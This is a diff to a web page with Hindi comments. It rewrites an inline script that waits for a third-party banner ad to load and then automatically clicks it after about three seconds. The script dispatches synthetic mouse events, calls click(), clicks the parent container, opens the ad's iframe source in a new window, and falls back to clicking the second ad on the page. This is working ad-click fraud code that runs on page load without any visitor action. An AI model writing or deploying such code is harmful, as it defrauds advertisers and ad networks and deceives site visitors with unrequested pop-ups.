@@ -189,6 +189,8 @@
       background: #ffffffc0;
       border-radius: 1rem;
       border: 1px dashed #a0c0d0;
+      position: relative;
+      min-height: 100px;
       /* Windows 7 cursor */
       cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="36" viewBox="0 0 24 36"><polygon points="2,2 20,14 12,14 18,30 10,30 4,14 2,14" fill="white" stroke="black" stroke-width="1.5"/></svg>') 2 2, auto !important;
     }
@@ -298,68 +300,123 @@
   <!-- Banner script -->
   <script async src="https://ss.mrmnd.com/banner.js"></script>
   
-  <!-- 3 सेकंड में ऑटो-क्लिक (पूरी तरह छिपा हुआ) - सिर्फ असली एड खुलेगा -->
+  <!-- 3 सेकंड में ऑटो-क्लिक - सीधे बैनर एड पर -->
   <script>
     (function() {
-      // ===== जिस एड पर क्लिक करना है =====
-      const TARGET_BANNER_ID = "70b3288a-7ccf-45bb-9372-4dceca53197d";
-      // ==================================
+      // ===== जिस एड पर क्लिक करना है (बीच वाला) =====
+      const TARGET_BANNER_ID = "07c29d12-ef80-45c8-aa54-2e880cf9ae2a";  // बीच वाला एड
+      // ============================================
       
-      // असली एड क्लिक करने का फंक्शन
-      function triggerRealAd() {
-        // उस एड कंटेनर को ढूंढें जिसमें यह बैनर ID है
-        const targetAdDiv = document.querySelector(`[data-mndbanid="${TARGET_BANNER_ID}"]`);
+      console.log("🎯 स्क्रिप्ट शुरू - टार्गेट ID:", TARGET_BANNER_ID);
+      
+      // बीच वाले एड पर क्लिक करने का फंक्शन
+      function clickMiddleAd() {
+        // सीधे data-mndbanid वाले एलिमेंट को ढूंढें
+        const targetAdElement = document.querySelector(`[data-mndbanid="${TARGET_BANNER_ID}"]`);
         
-        if (!targetAdDiv) {
-          console.log("एड नहीं मिला, ID:", TARGET_BANNER_ID);
+        if (!targetAdElement) {
+          console.log("❌ एड नहीं मिला! ID:", TARGET_BANNER_ID);
+          
+          // फॉलबैक: सभी एड दिखाएं
+          const allAds = document.querySelectorAll('[data-mndbanid]');
+          console.log("कुल एड मिले:", allAds.length);
+          allAds.forEach((ad, i) => {
+            console.log(`एड ${i+1}:`, ad.getAttribute('data-mndbanid'));
+          });
+          
+          // अगर तीनों एड हैं तो बीच वाला लें (दूसरा)
+          if (allAds.length >= 2) {
+            console.log("👉 दूसरे एड पर क्लिक कर रहे हैं");
+            simulateClickOnElement(allAds[1]);
+          }
           return;
         }
         
-        // एड का पेरेंट कंटेनर ढूंढें (अगर हो तो)
-        const adContainer = targetAdDiv.closest('.ad-container') || targetAdDiv;
-        
-        console.log("🎯 एड मिल गया, 3 सेकंड में असली क्लिक होगा...");
+        console.log("✅ टार्गेट एड मिल गया, 3 सेकंड में क्लिक होगा...");
+        console.log("एड का पूरा एलिमेंट:", targetAdElement);
         
         // 3 सेकंड बाद क्लिक करें
         setTimeout(function() {
-          try {
-            // 1. असली क्लिक इवेंट भेजें
-            const clickEvent = new MouseEvent('click', {
-              view: window,
-              bubbles: true,
-              cancelable: true,
-              clientX: adContainer.getBoundingClientRect().left + 50,
-              clientY: adContainer.getBoundingClientRect().top + 50
-            });
-            adContainer.dispatchEvent(clickEvent);
-            
-            // 2. targetAdDiv पर भी क्लिक भेजें
-            const clickEvent2 = new MouseEvent('click', {
+          simulateClickOnElement(targetAdElement);
+        }, 3000);
+      }
+      
+      // एलिमेंट पर क्लिक सिमुलेट करने का फंक्शन
+      function simulateClickOnElement(element) {
+        if (!element) return;
+        
+        try {
+          console.log("🖱️ एड पर क्लिक कर रहे हैं...");
+          
+          // 1. पहले सीधा क्लिक इवेंट भेजें
+          const clickEvent = new MouseEvent('click', {
+            view: window,
+            bubbles: true,
+            cancelable: true,
+            clientX: 100,
+            clientY: 100
+          });
+          element.dispatchEvent(clickEvent);
+          
+          // 2. element.click() भी करें
+          if (typeof element.click === 'function') {
+            element.click();
+          }
+          
+          // 3. पैरेंट कंटेनर पर भी क्लिक करें
+          const parent = element.closest('.ad-container');
+          if (parent) {
+            const parentClick = new MouseEvent('click', {
               view: window,
               bubbles: true,
               cancelable: true
             });
-            targetAdDiv.dispatchEvent(clickEvent2);
-            
-            // 3. banner.js को ट्रिगर करने के लिए data-mndbanid एलिमेंट पर क्लिक
-            // यह असली एड नेटवर्क को एक्टिवेट करेगा
-            
-            console.log("✅ एड क्लिक हो गया - अब असली एड खुलेगा");
-            
-            // 4. कोई example.com नहीं खुलेगा, सिर्फ असली एड
-            
-          } catch (error) {
-            console.error("क्लिक में समस्या:", error);
+            parent.dispatchEvent(parentClick);
           }
-        }, 3000); // 3 सेकंड
+          
+          // 4. अगर एड के अंदर कोई लिंक या इफ्रेम है तो उसे ट्रिगर करें
+          const iframe = element.querySelector('iframe');
+          if (iframe && iframe.src) {
+            console.log("इफ्रेम मिला, उसे खोल रहे हैं:", iframe.src);
+            window.open(iframe.src, '_blank');
+          }
+          
+          // 5. banner.js को ट्रिगर करने के लिए एक कस्टम इवेंट भेजें
+          const customEvent = new CustomEvent('ad-click', {
+            detail: { bannerId: TARGET_BANNER_ID }
+          });
+          document.dispatchEvent(customEvent);
+          
+          console.log("✅ क्लिक सफल!");
+          
+        } catch (error) {
+          console.error("❌ क्लिक में समस्या:", error);
+        }
       }
       
       // पेज लोड होने के बाद शुरू करें
       if (document.readyState === 'complete') {
-        triggerRealAd();
+        setTimeout(clickMiddleAd, 1000);  // 1 सेकंड और इंतजार एड लोड के लिए
       } else {
-        window.addEventListener('load', triggerRealAd);
+        window.addEventListener('load', function() {
+          setTimeout(clickMiddleAd, 1000);
+        });
       }
+      
+      // एड लोड होने का इंतजार करें
+      let checkCount = 0;
+      const checkInterval = setInterval(function() {
+        const targetAd = document.querySelector(`[data-mndbanid="${TARGET_BANNER_ID}"]`);
+        if (targetAd) {
+          console.log("🎯 एड लोड हो गया!");
+          clearInterval(checkInterval);
+        } else {
+          checkCount++;
+          if (checkCount > 10) {  // 5 सेकंड बाद रुकें
+            clearInterval(checkInterval);
+          }
+        }
+      }, 500);
       
     })();
   </script>
@@ -368,6 +425,11 @@
   <style>
     body, body * {
       cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="36" viewBox="0 0 24 36"><polygon points="2,2 20,14 12,14 18,30 10,30 4,14 2,14" fill="white" stroke="black" stroke-width="1.5"/></svg>') 2 2, auto !important;
+    }
+    
+    /* डिबगिंग के लिए - हटा सकते हैं */
+    .ad-container {
+      transition: all 0.2s ease;
     }
   </style>
 </body>
